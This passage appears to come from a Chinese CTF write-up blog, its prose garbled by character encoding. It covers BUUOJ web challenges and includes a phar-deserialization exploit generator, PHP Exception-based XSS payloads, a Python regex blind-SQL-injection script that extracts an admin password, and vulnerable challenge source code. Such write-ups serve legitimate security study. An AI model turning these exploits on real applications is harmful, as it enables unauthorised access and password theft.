	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br></div></div><p>æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ï¼Œåˆæ˜¯è€ƒpharæ–‡ä»¶Â·Â·Â·è¿™ä¸ªé¢˜ç›®ä¸ç”¨æ‰¾POPé“¾ï¼Œç›´æ¥åˆ©ç”¨__destruct()é­”æœ¯æ–¹æ³•å°±è¡Œ</p> <p>ç”Ÿæˆpharæ–‡ä»¶çš„expï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;GXYd439ecb8900f38de9127690557ec3a3d&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'highlight_file(&quot;/var/www/html/flag.php&quot;);'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;A.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;A.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;GIF98a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      

<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;test.txt&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>ä¹‹ååˆ©ç”¨nameå‚æ•°è§¦å‘phar://åè®®ï¼Œå†ä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å³å¯æ‹¿åˆ°flagã€‚</p> <h3 id="xssä¹‹å…‰"><a href="#xssä¹‹å…‰" class="header-anchor">#</a> xssä¹‹å…‰</h3> <p>çœ‹ä¼¼XSSï¼Œå®åˆ™è€ƒPHPåŸç”Ÿç±»çš„ååºåˆ—åŒ–</p> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>PHPåŸç”Ÿç±»ååºåˆ—åŒ–æ¼æ´</strong></li></ul> <p>é¢˜ç›®å­˜åœ¨gitæºç æ³„éœ²ï¼Œæ¢å¤ä¸€ä¸‹ï¼Œæºç å¦‚ä¸‹ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//index.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>æ— æ³•æ„é€ POPé“¾çš„æ—¶å€™è€ƒè™‘ç”¨ä¸€ä¸‹PHPåŸç”Ÿç±»ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener noreferrer">è¿™é‡Œ<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <ul><li>toString()æ–¹æ³•ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²çš„æ—¶å€™è§¦å‘</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720181034.png" alt="image-20200720181027058"></p> <p>ç”±äºæœåŠ¡å™¨PHPç‰ˆæœ¬æ˜¯5.6ï¼Œæ‰€ä»¥ç”¨<em>Exception</em>ç±»æ¥æ‰“ã€‚åˆ©ç”¨echoæ¥è§¦å‘<em>Exception</em>ç±»ä¸­çš„toString()æ–¹æ³•ï¼Œä»è€Œé€ æˆXSSã€‚</p> <p>ç”Ÿæˆpayloadï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;script&gt;alert&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¼ å‚ï¼š</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720181232.png" alt="image-20200720181232219" style="zoom:67%;"> <p>XSSæˆåŠŸï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¸‹å“åº”å¤´ä¸­å¹¶æ²¡æœ‰å¸¦å‡ºflagï¼Œçœ‹äº†ä¸€ä¸‹WPå¥½åƒæ˜¯é¢˜ç›®çš„é—®é¢˜ï¼ŸğŸ˜è¦ä¼ ä¸€ä¸ªäº§ç”Ÿè·³è½¬çš„payloadæ¥å¸¦å‡ºflagï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>BurpæŠ“ä¸€ä¸‹åŒ…æ”¾åˆ°Repeateræ¨¡å—é‡å‘ä¸€ä¸‹ï¼Œåœ¨å“åº”å¤´å°±èƒ½çœ‹åˆ°å¸¦å‡ºçš„flagï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182116.png" alt="image-20200720182116196"></p> <h3 id="harekazectf2019-easy-notes"><a href="#harekazectf2019-easy-notes" class="header-anchor">#</a> [HarekazeCTF2019]Easy Notes</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>sessionæ–‡ä»¶ä¼ªé€ </strong></li> <li><strong>sessionååºåˆ—åŒ–</strong></li></ul> <h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="header-anchor">#</a> SQLæ³¨å…¥</h2> <h3 id="sqli"><a href="#sqli" class="header-anchor">#</a> SQLi</h3> <p><strong>è€ƒç‚¹ï¼šæ­£åˆ™ç›²æ³¨</strong></p> <p>æç¤ºSQLæ³¨å…¥ï¼Œè¾“äº†å‡ ä¸ªå…³é”®å­—å‡å¼¹çª—â€˜hackerâ€™ï¼Œç®€å•åšäº†ä¸€ä¸‹FUZZæµ‹è¯•ï¼Œå‘ç°è¿˜æ˜¯æœ‰å‡ ä¸ªå­—ç¬¦å¯ä»¥ä½¿ç”¨ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223435.png" alt="image-20200713223435354"></p> <p>æ¥ç€æ‰«äº†ä¸ªåå°ï¼Œæ‰«åˆ°äº†hint.txt</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223512.png" alt="image-20200713223512297"></p> <p>hint.txtçš„å†…å®¹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223535.png" alt="image-20200713223535231"></p> <p>å¯ä»¥çœ‹åˆ°ä¸€äº›å¸¸è§„çš„SQLæ³¨å…¥å…³é”®å­—éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œç„¶åæç¤ºæˆ‘ä»¬åªè¦æ‹¿åˆ°adminçš„å¯†ç ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚å¦å¤–ï¼Œé¦–é¡µå‘Šè¯‰äº†æˆ‘ä»¬æŸ¥è¯¢çš„sqlè¯­å¥ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713235335.png" alt="image-20200713223704573"></p> <p>è€ƒè™‘ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼ŒåŒå¼•å·å’Œæ­£åˆ™æ²¡è¢«è¿‡æ»¤ï¼Œç„¶åpasswdå’Œusernameè¿˜åœ¨ä¸€å¼ è¡¨é‡Œé¢ï¼Œç”¨æ­£åˆ™ç›²æ³¨å§ã€‚ã€‚</p> <p>æ²¡æ³•ç”¨æ³¨é‡Šç¬¦å·ï¼Œè€ƒè™‘ç”¨%00è¿›è¡Œæˆªæ–­ã€‚</p> <p>expå¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

url <span class="token operator">=</span> <span class="token string">'http://e3fe3f17-c256-42fe-81f2-7fcd51370966.nodebuuoj.cn/'</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
password <span class="token operator">=</span> <span class="token string">''</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'1234567890!@#$%&amp;()-=[];{}:&quot;&lt;&gt;_qwertyuiopasdfghjklzxcvbnm'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
            <span class="token string">&quot;passwd&quot;</span><span class="token punctuation">:</span> <span class="token string">'||passwd/**/REGEXP/**/&quot;^{}&quot;;\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>password <span class="token operator">+</span> j<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            password <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>ä¸è¿‡æœ‰ç‚¹å¥‡æ€ªçš„æ˜¯burpè·‘å‡ºæ¥çš„çŠ¶æ€ç æ˜¯302ï¼Œåˆ°pythoné‡Œå°±æˆäº†404äº†Â·Â·Â· æä¸æ‡‚</p> <p>ç„¶åæ³¨æ„%00åœ¨pythoné‡Œç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæˆ\x00å³å¯</p> <p>è·‘å‡ºæ¥çš„å¯†ç ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713234428.png" alt="image-20200713234353205"></p> <p>ç”¨æˆ·åä»»æ„ï¼Œç™»å½•å³å¯</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713234630.png" alt="image-20200713234630437"></p> <h3 id="ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="header-anchor">#</a> ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>INSERTæ³¨å…¥</strong></li> <li><strong>ååºåˆ—åŒ–</strong></li></ul> <p>BUUOJçš„ç¯å¢ƒé¢˜ç›®ç›´æ¥ç»™äº†githubçš„æºç ï¼Œcloneä¸‹æ¥ï¼Œæºç å¦‚ä¸‹(éƒ¨åˆ†å…³é”®ä½ç½®å·²ç»åšäº†æ³¨é‡Š)ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//helper.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
	<span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;pic/&quot;</span><span class="token punctuation">;</span>
	<span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span> 
	<span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;config.txt&quot;</span><span class="token punctuation">;</span>
	<span class="token comment">// The function is not yet perfect, it is not open yet.</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//getfile-&gt;check</span>
		<span class="token comment">//è¿”å›ä¸€ä¸ªå‚¨å­˜ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯çš„æ•°ç»„</span>
		<span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//å¤åˆ¶ç»™æ–°åˆ›å»ºçš„æ•°ç»„$array</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;title&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;ext&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;path&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token comment">//getimagesizeå‡½æ•°è¿”å›ä¸€ä¸ªå›¾ç‰‡ä¿¡æ¯çš„æ•°ç»„ï¼ŒåŒ…å«å›¾ç‰‡é«˜åº¦å®½åº¦ç­‰</span>
		<span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;width&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;height&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å½¢å¼å­˜å‚¨å›¾åƒé«˜åº¦å’Œå®½åº¦</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Something wrong!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//ä¸Šä¼ çš„æ–‡ä»¶çš„åç§°</span>
		<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//åªå…è®¸ä¸Šä¼ ä»¥ä¸‹å››ç§åç¼€åçš„æ–‡ä»¶</span>
		<span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpeg&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
